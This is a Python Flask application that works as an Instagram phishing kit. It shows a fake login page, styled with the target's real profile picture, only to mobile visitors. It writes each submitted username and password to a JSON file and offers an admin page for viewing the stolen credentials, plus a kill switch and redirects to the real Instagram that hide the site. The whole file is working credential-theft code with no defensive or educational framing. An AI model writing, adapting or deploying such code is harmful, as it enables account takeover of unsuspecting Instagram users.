from flask import Flask, request, redirect, render_template
from os.path import exists
from datetime import datetime
from json import loads, dumps
from bs4 import BeautifulSoup
import requests
import os

app = Flask(__name__)

if not exists('password.txt'):
    with open('password.txt', 'w') as file:
        file.write("password")

if not exists('creds.json'):
    with open('creds.json', 'w') as file:
        file.write("[]")

if not exists('url.txt'):
    with open('url.txt', 'w') as file:
        file.write("https://www.instagram.com/")


def get_pfp(username):
    base_url = f"https://www.instagram.com/{username}/"
    
    response = requests.get(base_url)
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        
        meta_tag = soup.find("meta", property="og:image")
        
        if meta_tag:
            return meta_tag["content"]
        else:
            return False
    else:
        return "https://instagram.fcok4-1.fna.fbcdn.net/v/t51.2885-19/44884218_345707102882519_2446069589734326272_n.jpg?_nc_ht=instagram.fcok4-1.fna.fbcdn.net&_nc_cat=1&_nc_ohc=IvSYzbKdP6sAX8FLV-B&edm=AOQ1c0wBAAAA&ccb=7-5&ig_cache_key=YW5vbnltb3VzX3Byb2ZpbGVfcGlj.2-ccb7-5&oh=00_AfBxNhzq0oiKo-iCJt1UpyAn8HtcPXpkZnoyr6Y2GG7XyA&oe=650466CF&_nc_sid=8b3546"

@app.errorhandler(404)
def page_not_found(e):
    return redirect('https://www.instagram.com/404')

@app.route('/')
def index():
    return redirect('https://www.instagram.com')

@app.route('/accounts/<username>/login')
def login(username):
    user_agent = request.headers.get('User-Agent')
    
    if 'Mobile' in user_agent or 'Android' in user_agent or 'iOS' in user_agent:
        pfp = get_pfp(username)
        
        if not pfp:
            return redirect('https://www.instagram.com/404')
        
        return render_template("login.html", username=username, pfp=pfp)
        
    return redirect('https://www.instagram.com/404')   

@app.route('/accounts/<username>/submit', methods=['POST'])
def submit(username):
    if request.method == 'POST':
        data = request.form

        password = data.get('password')

        with open('creds.json', 'r') as file:
            data = loads(
                file.read()
            )

            data.append(
                {
                    "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "username": username,
                    "password": password
                }
            )

        with open('creds.json', 'w') as file:
            file.write(
                dumps(
                    data,
                    indent=4
                )
            )

    with open("url.txt", "r") as file:
        url = file.read()

    return redirect(url)

@app.route('/admin/<password>')
def view(password):
    with open("password.txt", "r") as file:
        real_password = file.read()

    if password == real_password:
        with open('creds.json', "r") as file:
            data = loads(
                file.read()
            )

        return render_template('admin.html', users=data)
    
    return redirect('https://www.instagram.com/404') 

@app.route('/change_url', methods=["POST"])
def change_url():
    if request.method == "POST":
        url = request.form.get("url")

        if not url:
            return redirect('https://www.instagram.com/404') 
        
        with open('url.txt', "w") as file:
            file.write(url)

        return f"URL changed to {url} successfully."
    
    return redirect('https://www.instagram.com/404') 

@app.route('/mayday')
def mayday():
    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("mayday.txt", "w") as file:
        file.write(f"{date} - {request.remote_addr}")

    print(f"{date} - MAYDAY !!! - {request.remote_addr}")

    os._exit(0)

if __name__ == '__main__':
    app.run()
